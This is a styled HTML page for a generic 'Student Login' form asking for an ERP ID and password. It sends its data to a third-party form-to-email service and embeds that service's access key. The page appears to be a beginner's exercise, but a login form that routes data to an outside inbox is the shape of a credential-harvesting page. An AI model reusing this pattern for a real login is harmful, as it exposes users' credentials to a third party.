<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>College Student Login</title>
    <style>
        /* Body Styling */
        body {
            background: linear-gradient(to right, #0f0f0f, #434343);
            font-family: 'Arial', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: white;
        }

        /* Form Container */
        .login-container {
            background-color: rgba(255, 255, 255, 0.1);
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4);
            max-width: 400px;
            width: 100%;
            text-align: center;
            transition: 0.5s;
            background-image: linear-gradient(rgba(0, 0, 0, 0.805), rgba(128, 128, 128, 0.789),rgba(0, 0, 128, 0.323));
        }

        /* Form Heading */
        .login-container h2 {
            margin-bottom: 30px;
            font-size: 26px;
            color: #fff;
        }

        /* Input Fields */
        .login-container input[type="text"],
        .login-container input[type="password"] {
            width: 100%;
            padding: 15px;
            margin: 10px 0;
            border-radius: 10px;
            border: none;
            font-size: 16px;
            background-color: rgba(8, 0, 0, 0.177);
            color:black;
        }

        .login-container input[type="text"]:focus,
        .login-container input[type="password"]:focus {
            outline: none;
            background-color: rgba(240, 248, 255, 0.529);
        }

        /* Login Button */
        .login-container button {
            width: 107%;
            padding: 15px;
            /* background-color: rgba(12, 176, 241, 0.708);*/
            border: none;
            border-radius: 10px;
            color: white;
            font-size: 18px;
            cursor: pointer;
            transition: background-color 0.3s;
            background-image: linear-gradient(rgba(128, 128, 128, 0.755), rgba(0, 0, 255, 0.574));
        }

        .login-container button:hover {
            background-image: linear-gradient(rgb(128, 128, 128), rgba(10, 10, 239, 0.475));
        }

        /* Footer Text */
        .login-container p {
            margin-top: 20px;
            font-size: 14px;
            color: #ccc;
        }

        .login-container a {
            color: aquamarine;
            text-decoration: none;
        }

        .login-container a:hover {
            text-decoration: underline;
        }

        .login-container:hover {
            box-shadow: 10px 10px 10px rgba(0, 0, 0, 0.6);
            transform: translateY(10px);
        }

        /* Media Queries for Responsive Design */
        @media screen and (max-width: 768px) {
            .login-container {
                padding: 30px;
                width: 90%;
            }

            .login-container h2 {
                font-size: 22px;
            }

            .login-container input[type="text"],
            .login-container input[type="password"] {
                padding: 12px;
                font-size: 14px;
            }

            .login-container button {
                padding: 12px;
                font-size: 16px;
            }
        }
    </style>
</head>

<body>
    <div class="login-container">
        <h2>Student Login</h2>
        <form action="https://api.web3forms.com/submit" method="POST">

            <input type="hidden" name="access_key" value="e31081e7-f476-47fc-88fe-60d63f80b642">

            <input type="text" placeholder="ERP ID" name="ERP ID" required>
            <input type="password" placeholder="Password" required>
            <button type="submit">Login</button>

            <p>Forgot your password? <a href="#">Click here</a></p>
        </form>
    </div>
</body>

</html>
